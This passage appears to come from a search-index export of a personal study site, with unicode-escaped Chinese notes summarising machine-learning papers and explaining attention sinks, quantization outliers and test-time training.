\u4ecd\u7136\u4e0d\u523030%\u7684\u6210\u529f\u7387\uff0c\u6a21\u578b\u5f80\u5f80\u4f1a\u66f4\u503e\u5411\u4e8e\u4f7f\u7528\u81ea\u5df1\u7684\u4e16\u754c\u77e5\u8bc6</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2026-2/#24","title":"2.4","text":"<ul> <li>Code OCR<ul> <li>\u5229\u7528VLM\u7684\u80fd\u529b\uff0c\u5c06\u4ee3\u7801\u8f93\u5165\u4ece\u6587\u672c\u8f6c\u6362\u6210\u56fe\u50cf\uff0c\u529b\u6c42\u8fdb\u4e00\u6b65\u538b\u7f29\u63d0\u9ad8\u6548\u7387</li> </ul> </li> <li>https://arxiv.org/pdf/2602.01630<ul> <li>\u672c\u6587\u662fKling\u7684\u4e00\u7bc7\u5173\u4e8eWorld Model\u7684\u8ba8\u8bba\uff0c\u5176\u8bba\u8ff0\u4e86World Model\u5e94\u8be5\u5305\u542b\u7684\u5185\u5bb9\u548c\u529f\u80fd\uff0c\u5e76\u4e14\u6279\u5224\u4e86\u5f53\u524dWorld Model\u7684\u524d\u8fdb\u65b9\u5411\uff0c\u4e3b\u8981\u662f\u5728\u67d0\u4e2a\u5177\u4f53\u7684\u4efb\u52a1\uff0c\u6bd4\u5982vision generation\u4e0a\u6ce8\u5165\u7269\u7406\u89c4\u5219\u7684\u77e5\u8bc6</li> <li>\u672c\u6587\u63d0\u51fa\uff0c\u4e00\u4e2aWorld Model\u7684\u6846\u67b6\u6216\u8005\u6a21\u578b\uff0c\u5fc5\u987b\u5177\u6709\u4ee5\u4e0b\u5185\u5bb9\u548c\u529f\u80fd<ul> <li>Interation \u591a\u6a21\u6001\u7684\u611f\u77e5+\u52a8\u4f5c\u63a5\u53e3</li> <li>Reasoning \u56e0\u679c\u63a8\u7406\u7684\u80fd\u529b</li> <li>Memory \u7ed3\u6784\u5316\uff0c\u53ef\u538b\u7f29\uff0c\u52a8\u6001\u66f4\u65b0\u7684\u957f\u65f6\u8bb0\u5fc6</li> <li>Environment \u53ef\u751f\u6210\uff0c\u53ef\u54cd\u5e94\uff0c\u7269\u7406\u4e00\u81f4\u7684\u4eff\u771f/\u771f\u5b9e\u73af\u5883</li> <li>Multimodal Genaration \u591a\u6a21\u6001\u7684\u751f\u6210\u80fd\u529b</li> </ul> </li> </ul> </li> </ul> <ul> <li>Paper Banana<ul> <li>\u5229\u7528nano banana\u6784\u5efaAgent workflow\uff0c\u7528\u4e8e\u5b9e\u73b0\u7cbe\u7f8e\u7684\u79d1\u7814\u5236\u56fe</li> </ul> </li> </ul> <ul> <li>Seed Prover<ul> <li>Agentic Prover for Math Problem</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2026-2/#28","title":"2.8","text":"<ul> <li>residual context diffusion<ul> <li>\u5148\u524d\u7684diffusion llm\u6bcf\u6b21\u89e3\u7801\u5b8c\u6210\u4e4b\u540e\uff0c\u90fd\u4f1a\u5c06\u7f6e\u4fe1\u5ea6\u4f4e\u4e8e\u9608\u503c\u7684token remask\uff0c\u4f46\u662f\u8fd9\u4e00\u90e8\u5206token\u540c\u6837\u5b58\u5728\u4e30\u5bcc\u7684\u8bed\u4e49\u4fe1\u606f\uff0c\u8fd9\u7bc7\u8bba\u6587\u5c06\u8fd9\u4e00\u90e8\u5206token reweight\u4e4b\u540e\u8f6c\u6362\u4e3a\u4e0b\u4e00\u6b21\u9884\u6d4b\u7684\u4e0a\u4e0b\u6587</li> </ul> </li> </ul> <ul> <li>Parallel Coordinated Reasoning<ul> <li>\u5e76\u884c\u89e3\u7801\u4e0a\u767e\u6761\u601d\u7ef4\u94fe\uff0c\u7136\u540e\u901a\u8fc7\u603b\u7ed3\u538b\u7f29\u7684\u65b9\u6848\u8fdb\u884c\u6c47\u603b\uff0c\u5728\u4e0d\u6269\u5c55\u4e0a\u4e0b\u6587\u7a97\u53e3\u7684\u60c5\u51b5\u63d0\u5347\u63a2\u7d22\u6027\u80fd</li> </ul> </li> <li>lingbot depth<ul> <li>\u9488\u5bf9\u6d88\u8d39\u7ea7\u76f8\u673a\u5728\u73bb\u7483\uff0c\u955c\u9762\u548c\u91d1\u5c5e\u8868\u9762\u7b49\u9ad8\u96be\u5ea6\u573a\u666f\u4e0b\u8fdb\u884c\u6df1\u5ea6\u5206\u5272\uff0c\u4f7f\u7528\u7684\u65b9\u6848\u662fMasked Depth Modeling\uff0c\u4e5f\u5c31\u662f\u5c06\u8fd9\u4e9b\u9ad8\u96be\u5ea6\u573a\u666f\u7684\u90e8\u5206\u5efa\u7acbmask\uff0c\u7528\u6574\u4e2a\u753b\u9762\u4e2d\u7684RGB\u4fe1\u606f\u5bf9\u5176\u8fdb\u884c\u9884\u6d4b</li> <li>\u4e0eDA3\u8fd9\u4e9b\u6a21\u578b\u7684\u533a\u522b\u5728\u4e8e\uff0cDA3\u662f\u5728\u4e00\u4e2a\u5355\u56fe\u751f\u6210\u7684\u6df1\u5ea6\u4f30\u8ba1\uff0c\u800c\u8fd9\u4e2a\u9879\u76ee\u662f\u8865\u5168\u5de5\u4e1a\u573a\u666f\u7684\u4e00\u4e9b\u6df1\u5ea6\u6444\u50cf\u5934\uff0c\u4e5f\u5c31\u662f\u5bf9\u5de5\u4e1a\u6444\u50cf\u5934\u7684\u4e00\u4e2a\u8865\u5f3a\uff0c\u800cDA3\u662f\u4e00\u4e2a\u901a\u7528\u6a21\u578b</li> </ul> </li> <li>Golden Goose<ul> <li>\u4e00\u79cd\u5c06\u5e38\u89c4\u7684\u6587\u672c\u8f6c\u6362\u6210RL\u6570\u636e\u7684\u4e00\u4e2a\u65b9\u6848\uff0c\u63d0\u4f9b\u4e86\u4e00\u4e2a\u6570\u636e\u5904\u7406pipeline</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2026-2/#210","title":"2.10","text":"<ul> <li>thinkRL-edit<ul> <li>\u672c\u8d28\u662f\u5bf9\u4e8eimage edit\u6a21\u578b\u8fdb\u884cRL\uff0c\u4f46\u662f\u5176\u6a21\u578b\u67b6\u6784\u4e2d\u65e2\u5305\u542b\u4e86\u63a8\u7406\u6a21\u578b\u53c8\u5305\u542b\u4e86\u751f\u6210\u6a21\u578b</li> </ul> </li> </ul> <ul> <li>large concept model<ul> <li>\u5bf9\u4e8etokenizer\u7684\u90e8\u5206\u505a\u51fa\u6539\u52a8\uff0ctokenizer\u5bf9\u4e8e\u8bed\u4e49\u8fdb\u884c\u9759\u6001\u7684\u8868\u5f81\uff0c\u4f46\u662f\u8bed\u8a00\u4e2d\u90e8\u5206\u6982\u5ff5\u627f\u8f7d\u4e86\u5927\u91cf\u7684\u63a8\u7406\u4fe1\u606f\uff0c\u53e6\u5916\u7684\u90e8\u5206\u5219\u8f83\u4e3a\u7a00\u758f</li> <li>\u56e0\u6b64\u5728\u8fd9\u4e2a\u8bba\u6587\u4e2d\uff0c\u63d0\u51fa\u5728latent space\u4e2d\u5b66\u4e60\u52a8\u6001\u7684\u8bed\u4e49\u8fb9\u754c\uff0c\u8bb2\u5e8f\u5217\u52a8\u6001\u5206\u5272\u4e3a\u6982\u5ff5\u7247\u6bb5</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2026-2/#212","title":"2.12","text":"<ul> <li>large lora rl<ul> <li>Mind Lab \u63d0\u51fa\u7684\uff0c\u9488\u5bf9\u8d85\u5927\u89c4\u6a21\u53c2\u6570\uff0c\u6bd4\u59821TB\u7684kimi\u6a21\u578b\u8fdb\u884clora rl\u5fae\u8c03\u7684\u65b9\u6848</li> <li>\u4f7f\u7528\u7684\u662fverl\u548cmegatron bridge</li> <li>\u76f8\u6bd4\u4e8e\u5168\u91cf\u5fae\u8c03\u65b9\u6848\uff0c\u53ea\u9700\u898110%\u7684GPU\u5373\u53ef\u5b8c\u6210\u5fae\u8c03</li> </ul> </li> <li>scale agent rl in terminal environment<ul> <li>\u8fd9\u662fqwen\u56e2\u961f\u7684\u4e00\u7bc7\u535a\u5ba2\uff0c\u8bb2\u8ff0\u4e86\u5982\u4f55\u7528ROLL, ROCK\u548ciflow\u6765\u5b9e\u73b0\u7a33\u5b9a\u7684agent rl\u8bad\u7ec3</li> <li>\u6bd4\u8f83\u7ec6\u8282\u5730\u8bb2\u8ff0\u4e86\u5176\u4e2d\u7684\u5404\u9879\u53d6\u820d\u548c\u8e29\u5751</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2026-2/#224","title":"2.24","text":"<ul> <li>lingbot world<ul> <li>\u4e5f\u662fblock diffusion\u8303\u5f0f\u4e0b\u7684\u89c6\u9891\u751f\u6210</li> </ul> </li> </ul>"},{"location":"reading/dailyreading/2026-2/#227","title":"2.27","text":"<ul> <li>Reasoning LLM\uff0c\u8fd9\u5f20\u56fe\u6bd4\u8f83\u5b8c\u6574\u5730\u4ecb\u7ecd\u4e86Reasoning LLM\u7684\u53d1\u5c55\u72b6\u6001\uff0c\u6bd4\u5982\u662f\u4ec0\u4e48\uff0c\u4e3a\u4ec0\u4e48\uff0c\u600e\u4e48\u505a</li> </ul>"},{"location":"reading/dailyreading/2026-2/#228","title":"2.28","text":"<ul> <li>GradLoc<ul> <li>\u6df7\u5143\u63d0\u51fa\u7684\u4e00\u4e2a\u5de5\u5177\uff0c\u6839\u636e\u68af\u5ea6\u7684\u5f02\u5e38\u73b0\u8c61\uff0c\u81ea\u52a8\u5b9a\u4f4d\u5230\u89e6\u53d1\u5f02\u5e38\u7684token\uff0c\u5e76\u4e14\u5206\u6790\u539f\u56e0\uff0c\u5305\u62ec\u8bad\u63a8\u4e0d\u4e00\u81f4\uff0c\u5c42\u95f4\u68af\u5ea6\u5f02\u8d28\u6027</li> </ul> </li> </ul> <ul> <li>https://arxiv.org/pdf/2601.18217<ul> <li>\u8fd9\u7bc7Meta\u7684\u8bba\u6587\u8bb2\u8ff0\u4e86\u5728\u5bf9\u5c11\u91cf\u7684domain\u505aPost-Train\u7684\uff0c\u5982\u4f55\u5728general\u7684\u73b0\u5b9e\u73af\u5883\u4e2d\u751f\u6548\uff0c\u6709\u8fd9\u6837\u4e00\u4e9bInsights</li> <li>\u5728\u539f\u59cb\u7684\u73af\u5883\u89c2\u5bdf\u4e2d\u6ce8\u5165\u5c11\u91cf\u76ee\u6807\u65e0\u5173\u7684\u6587\u672c\u4fe1\u606f\uff0c\u5728OOD\u4eba\u7269\u4e0a\u83b7\u5f97\u4e86\u53ef\u89c2\u7684\u6210\u529f\u7387\u63d0\u5347</li> <li>Step by Step Thinking \u5728In-domain\u4efb\u52a1\u4e0d\u4e00\u5b9a\u6709\u6027\u80fd\u63d0\u5347\uff0c\u4f46\u662f\u5bf9\u4e8eOOD\u4efb\u52a1\u63d0\u5347\u663e\u8457</li> </ul> </li> <li>LOCA bench<ul> <li>\u8d85\u957f\u4e0a\u4e0b\u6587\u7684agent\u4efb\u52a1 benchmark</li> </ul> </li> <li>Prism block sparse attention</li> </ul>"},{"location":"reading/dailyreading/2026-2/#-block-sparse-attention","title":"- \u57fa\u4e8e\u5149\u8c31\u611f\u77e5\u7684Block Sparse Attention","text":""},{"location":"reading/interesting/Attention%20Sink/","title":"Attention Sink","text":"<p>Attention Sink\u73b0\u8c61\u662f\u5728\u91cf\u5316\uff0c\u4f4d\u7f6e\u7f16\u7801\uff0c\u4ee5\u53ca\u5bf9\u4e8eAttention\u5185\u5bb9\u7684\u6539\u8fdb\u4e2d\u90fd\u5f88\u91cd\u8981\u7684\u73b0\u8c61</p> <p>StreamLLM\uff0c\u5982\u679c\u4e0d\u8003\u8651KV\u7684\u60c5\u51b5\uff0cAttention Sink\u6307\u5411\u7684\u662f\u4e00\u4e9b\u7279\u6b8a\u7684token\u5e76\u4e14\u5728\u4f4d\u7f6e\u7f16\u7801\u4e3a0\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5360\u636e\u5de8\u5927\u7684\u6ce8\u610f\u529b\u5185\u5bb9</p> <p>Attention Sink\u7684\u8d77\u56e0\u7684\u89e3\u8bfb\u6709\u5f88\u591a\uff0c\u53ef\u4ee5\u7b80\u5355\u6982\u62ec\u4e3a\u8fd9\u4e2a\u63cf\u8ff0\uff0c\u56e0\u4e3a\u6a21\u578b\u6709\u65f6\u4e0d\u9700\u8981\u6240\u6709\u7684\u5c42\u6765\u5b8c\u6210\u63a8\u7406\u4efb\u52a1\uff0c\u56e0\u6b64Attention Block\u9700\u8981\u6709\u8f93\u51fa\u4e0d\u53d8\u7684\u80fd\u529b\uff0c\u5728\u5e26\u6709\u6b8b\u5dee\u6d41\u7684\u65f6\u5019\u8868\u73b0\u4e3a\u8f93\u51fa\u4e3a0\u3002\u56e0\u6b64\u6a21\u578b\u5b66\u5230\u7684\u8303\u5f0f\u662f\u5c06\u524d\u51e0\u4e2atoken\u5728\u5fc5\u8981\u7684\u65f6\u5019\uff0cAttention Score\u8ba1\u7b97\u5f97\u5de8\u5927\uff0c\u540c\u65f6\u5176Value\u53c8\u5f88\u5c0f\uff0c\u5bfc\u81f4\u6574\u4f53\u7684Attention\u8f93\u51fa\u8d8b\u8fd1\u4e8e0\uff0c\u4e0d\u5f71\u54cd\u6b8b\u5dee\u6d41\u3002</p> <p>\u8fd9\u4e2a\u73b0\u8c61\u53ef\u4ee5\u901a\u8fc7Gated Attention\u8fd9\u79cd\u65b9\u6848\u6765\u89e3\u51b3</p>"},{"location":"reading/interesting/Attention%20Sink/#1-outlier-attention-sink-rope","title":"1. Outlier &amp; Attention Sink &amp; Rope","text":"<p>\u8fd9\u662f\u4e00\u7bc7\u6765\u81ea\u5fae\u4fe1\u516c\u4f17\u53f7\u7684\u6587\u7ae0\u4e2a\u4eba\u8ba4\u4e3a\u8bb2\u5f97\u4e0d\u9519\uff0c\u5728\u505a\u91cf\u5316\u7684\u65f6\u5019\uff0c\u4eba\u4eec\u5f80\u5f80\u4f1a\u5173\u6ce8\u5230\uff0cLLM\u4e2d\u5b58\u5728\u4e00\u4e9b\u79bb\u7fa4\u503c\uff0c\u5b83\u4eec\u5f80\u5f80\u51fa\u73b0\u5728\u524d\u51e0\u4e2atoken\u3002\u5e76\u4e14\u8fd9\u4e9btoken\u672c\u8eab\u7684\u6570\u503c\u4e0d\u91cd\u8981\uff0c\u91cd\u8981\u7684\u662f\u5b83\u4eec\u7684\u91cf\u7ea7\u8981\u9ad8\u4e8e\u5176\u4ed6\u6570\u503c\uff0c2000\u548c500\u533a\u522b\u4e0d\u5927\uff0c\u4f46\u662f2000\u523010\u8fd9\u4e2a\u91cf\u7ea7\u5c31\u4f1a\u6709\u95ee\u9898</p> <p></p> <p>\u6b63\u5982\u4e0a\u6587\u4e2d\u6240\u8bf4\u7684\u4e00\u6837\uff0c\u8fd9\u4e9b\u79bb\u7fa4\u503c\u5145\u5f53\u6ce8\u610f\u529b\u7684\u6c47\u70b9\uff0c\u5e76\u4e14\u6709\u5f88\u4f4e\u7684value\uff0c\u6700\u7ec8\u7684\u7ed3\u679c\u5c31\u662f\u5f62\u6210\u4e86\u6ce8\u610f\u529b\u7684\u7a7a\u64cd\u4f5c\u3002\u6211\u4eec\u901a\u8fc7\u4e00\u4e2a4B\u7684Qwen\u7684\u4f8b\u5b50\u6765\u770b\u770bAttention Sink\u600e\u4e48\u6784\u6210</p> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u9996\u4e2atoken\u5360\u636e\u4e86\u5927\u91cf\u7684\u6ce8\u610f\u529b\u6c47\u70b9</p> <p>\u4f46\u662f\u8fd9\u6837\u5b50\u4ecd\u7136\u4e0d\u80fd\u89e3\u91ca\u4e3a\u4ec0\u4e48\u8fd9\u6837\u5b50\u4f1a\u5f62\u6210 Attention \u7684\u7a7a\u64cd\u4f5c\uff0c\u56e0\u6b64\u6211\u4eec\u8981\u5173\u6ce8\u5230Attention Sink\u7684value\u503c\uff0c\u8fd9\u4e2a\u503c\u8db3\u591f\u5c0f\uff0c\u5c31\u53ef\u4ee5\u8ba9sink\u63a5\u53d7\u5927\u91cf\u7684softmax\u5e76\u4e14\u8f93\u51fa\u6781\u5c0f\uff0c\u5bf9\u4e8e\u6b8b\u5dee\u8fde\u63a5\u6765\u8bf4\u4e5f\u5373\u4e3a0</p> <p>\u4f46\u662f\u5b9e\u9645\u4e0a\uff0c\u6211\u4eec\u5176\u5b9e\u5e76\u4e0d\u9700\u8981channel-wise outliers\u6765\u5f62\u6210\u6ce8\u610f\u529b\u6c47\u70b9\uff0c\u53ea\u9700\u8981\u8ba9\u6c47\u70b9token\u7684key\u6570\u503c\u548c\u666e\u901atoken\u6709\u8db3\u591f\u5927\u7684\u5dee\u5f02\u5373\u53ef\uff0c\u4e5f\u5c31\u662f\u8bf4\u4e00\u79cd\u65b9\u6848\u662f\u9760channel\u7ef4\u5ea6\u91cc\u7684\u51e0\u4e2a\u5f88\u5927\u7684\u6570\u503c\uff0c\u53e6\u4e00\u79cd\u65b9\u6848\u662f\u4f9d\u9760KV\u77e9\u9635\u7684\u5b66\u4e60\u5230\u4e00\u4e9b\u7279\u5f81\u5411\u91cf\uff0c\u53ef\u4ee5\u628a\u67d0\u4e9btoken\u548c\u5176\u4ed6token\u6b63\u4ea4\u5f00</p> <p></p> <p>\u90a3\u4e48\u4e3a\u4ec0\u4e48\u4e24\u79cd\u8def\u5f84\u4e2d\uff0cLLM\u9009\u62e9\u4e86channel-wise outlier\u8fd9\u79cd\u505a\u6cd5\u5462\uff0c\u539f\u56e0\u5728\u4e8eRope\u8fd9\u79cd\u4f4d\u7f6e\u7f16\u7801\u65b9\u6848</p> <p>\u9996\u5148\u6211\u4eec\u9700\u8981\u5206\u6790LLM\u5bf9\u4e8e\u957f\u4e0a\u4e0b\u6587\u7684\u4e00\u4e9b\u4fe1\u606f\uff0c\u539f\u59cb\u7684Attention\u64cd\u4f5c\uff0c\u4ece\u7406\u8bba\u4e0a\u6765\u8bf4\u4e0d\u76f8\u5173\u6587\u672c\u8d8a\u591a\uff0c\u5176\u56f0\u60d1\u5ea6\u81ea\u7136\u4f1a\u63d0\u5347\uff1b\u4f46\u662f\u5728\u8bad\u7ec3\u4e2d\uff0cAttention\u67b6\u6784\u81ea\u7136\u6f14\u5316\u51fa\u4e86\u65b9\u6848\u6765\u89e3\u51b3\u8fd9\u79cd\u73b0\u8c61\uff0cAnthropic\u53d1\u8868\u7684\u8bba\u6587\u4e2d\u53d1\u73b0\uff0c\u591a\u5934\u6ce8\u610f\u529b\u4e2d\u6709\u4e00\u4e9b\u5934\uff08\u5f52\u7eb3\u5934\uff09\uff0c\u4e13\u95e8\u7528\u6765\u5173\u6ce8\u5c40\u90e8\u4fe1\u606f\uff08\u53ef\u4ee5\u7406\u89e3\u4e3a\u5173\u6ce8topK\u7684\u6ce8\u610f\u529b\u6743\u91cd\u7684\u5185\u5bb9\uff09\uff1b\u53e6\u4e00\u90e8\u5206\u5934\uff08\u53ec\u56de\u5934\uff09\uff0c\u8d1f\u8d23\u6293\u53d6\u957f\u4e0b\u6587\u4e2d\u4e8e\u8be5token\u76f8\u5173\u7684\u4fe1\u606f\uff0c\u4f7f\u5176\u62e5\u6709\u66f4\u9ad8\u7684\u6ce8\u610f\u529b\u6743\u91cd</p> <p>\u4f46\u662f\u5728Rope\u4e2d\uff0c\u6211\u4eec\u5374\u8981\u4e3a\u8fdc\u7a0b\u7684token\u5206\u914d\u66f4\u5c0f\u7684attention score\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6a21\u578b\u4e0d\u5f97\u4e0d\u5206\u914d\u66f4\u5927\u91cf\u7ea7\u7684Attention Score\uff0c\u6765\u5bf9\u6297Rope\u7684\u8870\u51cf\uff0c\u56e0\u6b64\u5927\u591a\u6570\u7684\u79bb\u7fa4\u503c\u90fd\u51fa\u73b0\u5728\u53ec\u56de\u5934\u4e0a</p> <p></p> <p>\u56e0\u6b64\u540e\u7eed\u4e5f\u884d\u751f\u4e86\u4e00\u4e9b\u64cd\u4f5c\uff0c\u5728\u90e8\u5206Attention Head\u4e0a\u7981\u7528Rope\uff0c\u4f1a\u62e5\u6709\u66f4\u597d\u7684\u6548\u679c</p>"},{"location":"reading/interesting/Attention%20Sink/#2-a-unified-view-of-attention-and-residual-sinks","title":"2. A Unified View of Attention and Residual Sinks","text":"<ul> <li>https://mp.weixin.qq.com/s/9FEC995KPMb5SGHeWOKnmA</li> </ul> <p>\u8fd9\u7bc7\u8bba\u6587\u7b97\u662fQwen\u56e2\u961f\u4e2d\u5bf9\u4e8eGated Attention\u7684\u8bba\u6587\u7684\u7eed\u4f5c\uff0c\u91cd\u65b0\u5ba1\u89c6\u4e86Attention Sink\u73b0\u8c61\uff0c\u4ee5\u53ca\u5176\u4e2d\u7684\u5f02\u5e38\u503c\u4ea7\u751f\u7684\u539f\u56e0\u4ee5\u53ca\u5176\u5728\u8bad\u7ec3\u4e2d\u53d1\u6325\u7684\u4f5c\u7528\u3002\u4ee5\u53caGatedNorm\u7b49reScale\u65b9\u6848\u5982\u4f55\u5bf9\u4e8e\u8fd9\u4e9b\u5f02\u5e38\u503c\u4ea7\u751f\u4f5c\u7528</p> <p>\u5728\u4e4b\u524d\u7684\u5de5\u4f5c\u4e2d\uff0c\u4eba\u4eec\u53d1\u73b0\u4e86LLM\u4e2d\u4e24\u79cd\u5f02\u5e38\u503c</p> <ul> <li>Attention Sink: \u6700\u521d\u7684\u51e0\u4e2atoken\u4ea7\u751f\u7684\u6781\u5927\u7684\u6ce8\u610f\u529b\u5206\u6570</li> <li>Massive Actiavtion: Attention Sink\u76f8\u5173\u7684token\u5728\u67d0\u4e2a\u7279\u5f81\u4e0a\u4ea7\u751f\u7684\u6781\u5927\u7684\u6fc0\u6d3b\u503c</li> </ul> <p>\u4f46\u662f\u5728\u8fd9\u7bc7\u8bba\u6587\u4e2d\uff0c\u4f5c\u8005\u63d0\u51fa\u4e86Residual Sink\u8fd9\u4e2a\u73b0\u8c61\uff0c\u6307\u5411\u5728\u5927\u591a\u6570token\u4e2d\uff0c\u56fa\u5b9a\u7ef4\u5ea6\u4e0a\u4f1a\u51fa\u73b0\u4e00\u6279\u5f02\u5e38\u503c\u3002Attention Sink\u73b0\u8c61\u662f\u9488\u5bf9Softmax\u673a\u5236\u5b58\u5728\u7684\uff0c\u4f5c\u8005\u8ba4\u4e3aResidual Sink\u73b0\u8c61\u662f\u9488\u5bf9RMSnorm\u673a\u5236\u5b58\u5728\u7684\uff0c\u6240\u6709\u7684\u5f02\u5e38\u503c\u90fd\u662f\u6a21\u578b\u5c1d\u8bd5\u9690\u5f0f\u5730\u5bf9\u4e8esoftmax/rmsnorm\u8fdb\u884c\u7f29\u653e</p> <p>\u56e0\u6b64\u4f5c\u8005\u8ba4\u4e3a\u6211\u4eec\u53ef\u4ee5\u663e\u793a\u5730\u5f15\u5165\u7f29\u653e\u56e0\u5b50\uff0c\u9664\u4e86Gated Attention\u4ee5\u5916\uff0c\u8fd8\u53ef\u4ee5\u5f15\u5165Gated Norm\uff0c\u5728Loss\u4e0d\u53d8\u7684\u60c5\u51b5\u4e0b\uff0c\u5927\u5e45\u524a\u51cf\u7684\u5f02\u5e38\u503c\u7684\u51fa\u73b0\uff0c\u4f7f\u5f97\u6fc0\u8fdb\u7684\u91cf\u5316\u673a\u5236\u6bd4\u5982W4A4\uff08\u6743\u91cd\u548c\u6fc0\u6d3b\u503c\u90fd\u75284bit\uff09\u53ef\u4ee5\u5e94\u7528</p>"},{"location":"reading/interesting/Continual%20Learning/","title":"Continual Learning","text":""},{"location":"reading/interesting/Continual%20Learning/#test-time-training","title":"Test Time Training","text":"<ul> <li>https://arxiv.org/pdf/2512.23675</li> </ul> <p>TTT \u662f\u4e00\u4e2aContinual Learning\u7684\u65b9\u6848\uff0c\u65e9\u671f\u7684TTT\u8fd8\u6ca1\u6709\u5e94\u7528\u5728 LLM \u4e0a\uff0c\u5728\u6ca1\u6709scaling\u7684\u60c5\u51b5\u4e0b\uff0c\u57df\u5916\u6570\u636e\u5bf9\u4e8e\u6a21\u578b\u662f\u4e00\u4e2a\u96be\u9898\uff0c\u56e0\u6b64\u4eba\u4eec\u5f53\u65f6\u91c7\u7528\u4e86TTT\uff0c\u6765\u5904\u7406\u56fe\u50cf\u5206\u7c7b\u7b49\u4efb\u52a1</p> <p>\u76d1\u7763\u4fe1\u53f7</p> <p>\u6d4b\u8bd5\u65f6\u7684\u6570\u636e\u6ca1\u6709\u6807\u7b7e\uff0c\u56e0\u6b64\u4eba\u4eec\u8981\u624b\u52a8\u6784\u9020\u4e00\u4e9b\u53ef\u4f9b\u8bad\u7ec3\u7684\u6570\u636e\u51fa\u6765\uff0c\u5728\u6700\u521d\u7684TTT\u8bba\u6587\u4e0a\uff0c\u4eba\u4eec\u5c06\u56fe\u7247\u65cb\u8f6c\u7279\u5b9a\u89d2\u5ea6\uff0c\u7528\u6a21\u578b\u6765\u9884\u6d4b\u56fe\u7247\u65cb\u8f6c\u7684\u89d2\u5ea6\uff0c\u6765\u8fdb\u884c\u8bad\u7ec3\uff0c\u540e\u7eed\u53d1\u5c55\u51fa\u6765MAE\u7684\u65b9\u6848\uff0c\u4e5f\u5373\u906e\u4f4f\u56fe\u50cf\u7684\u90e8\u5206patch\uff0c\u7136\u540e\u9884\u6d4b\u906e\u4f4f\u7684\u90e8\u5206\uff0c\u66f4\u52a0\u6709\u6548\u4e14\u901a\u7528</p> <p>\u540e\u7eed\u8fdb\u5165LLM\u9886\u57df\u4e4b\u540e\uff0c\u76d1\u7763\u4fe1\u53f7\u81ea\u7136\u53d8\u6210\u4e86Next token prediction</p> <p>\u53c2\u6570\u66f4\u65b0</p> <p>\u5bf9\u4e8eTTT\u800c\u8a00\uff0c\u66f4\u65b0\u5168\u91cf\u53c2\u6570\u5f80\u5f80\u4e0d\u662f\u4e00\u4e2a\u73b0\u5b9e\u7684\u505a\u6cd5\uff0c\u5c24\u5176\u662f\u8fdb\u5165LLM\u9886\u57df\uff0c\u4eba\u4eec\u5f80\u5f80\u8003\u8651\u53ea\u66f4\u65b0</p> <ul> <li>Layer Norm</li> <li>Lora</li> <li>\u5185\u5d4c\u4e00\u4e2a\u51e0\u5c42\u7684\u5c0f\u6a21\u578b</li> </ul> <p>LLM TTT</p> <p>LLM\u5728\u65e9\u671f\u4e5f\u662f\u5f15\u5165\u4e86\u4e00\u4e2a\u5c0f\u578b\u7684\u795e\u7ecf\u7f51\u7edc\uff0c\u6a21\u62dfRNN\u4e2d\u7684\u9690\u72b6\u6001\uff0c\u6bcf\u4e2a\u65f6\u95f4\u6b65\u7528\u81ea\u76d1\u7763\u635f\u5931\u5bf9W\u505a\u68af\u5ea6\u66f4\u65b0\u3002\u4f46\u662f\u540e\u7eed\u4eba\u4eec\u4e3a\u4e86\u652f\u6301\u66f4\u52a0\u5b9e\u65f6\u5730\u8f93\u51fa\uff0c\u52aa\u529b\u964d\u4f4e\u8ba1\u7b97\u5f00\u9500\uff0c\u5c06\u795e\u7ecf\u7f51\u7edc\u66ff\u6362\u6210\u4e00\u4e2a\u7ebf\u6027\u6a21\u578b\uff0c\u4e5f\u5c31\u662f\u6ca1\u6709\u6fc0\u6d3b\u5c42\u7684MLP\uff0c\u76f8\u5f53\u4e8e\u4e58\u4e86\u4e00\u4e2a\u77e9\u9635\u3002</p> <p>TTT\u672c\u8d28\u662f\u8981\u505a\u4e0a\u4e0b\u6587\u5b66\u4e60\uff0c\u76f8\u6bd4\u4e8e\u9759\u6001\u7684context\u8f93\u5165\uff0cTTT\u53ef\u4ee5\u6539\u53d8\u90e8\u5206\u53c2\u6570\u6765\u9488\u5bf9\u73b0\u5728\u7684\u4e0a\u4e0b\u6587\u8fdb\u884c\u5b66\u4e60\uff0c\u4eba\u4eec\u5f00\u59cb\u8003\u8651\u7528TTT\u7684\u7ebf\u6027\u6a21\u578b\u6765\u66ff\u4ee3Self-Attention\uff08\u4e48\u6709\u66ff\u4ee3qkv\u77e9\u9635\uff0c\u53ea\u662f\u66ff\u4ee3\u4e86\u6700\u540e\u4e00\u6b65softmax\u64cd\u4f5c\uff09\u3002\u672c\u8d28\u4e0a\u6765\u8bf4\uff0cSelf-Attention\u673a\u5236\u4e0d\u627f\u62c5\u4e16\u754c\u8bb0\u5fc6\uff0c\u800c\u662f\u7528\u4f5c\u4e0a\u4e0b\u6587\u5185\u5173\u8054\u6027\u7684\u5b66\u4e60\uff0c\u548cTTT\u8981\u505a\u7684\u4e8b\u60c5\u4e00\u81f4\uff0c\u4f46\u662fTTT\u7684\u4f18\u52bf\u5728\u4e8e\u5176\u53ef\u4ee5\u6839\u636e\u4e0d\u540c\u7684\u4e0a\u4e0b\u6587\u4fee\u6539\u53c2\u6570</p> <p>\u8fd9\u65f6\u5019\u7684TTT\u5f00\u59cb\u53d8\u4e3aKV binding\uff0c\u4ec5\u589e\u52a0\u4e00\u4e2a\u7ebf\u6027\u6a21\u578b\u7684TTT\u5c31\u662fKV binding</p> <p>KV binding\u8fd9\u4e2a\u4e1c\u897f\u4e00\u5f00\u59cb\u548cTTT\u5e76\u6ca1\u6709\u8054\u7cfb\uff0c\u662f\u4eceKV cache\u90a3\u8fb9\u53d1\u5c55\u51fa\u6765\u7684\uff0cKV cache \u672c\u8eab\u968f\u7740token\u6570\u91cf\u7684\u589e\u52a0\u7ebf\u6027\u589e\u957f\uff0c\u4eba\u4eec\u5f00\u59cb\u8003\u8651\u5404\u79cd\u65b9\u6848\u6765\u964d\u4f4e\u8fd9\u4e2a\u5f00\u9500\uff0cKV 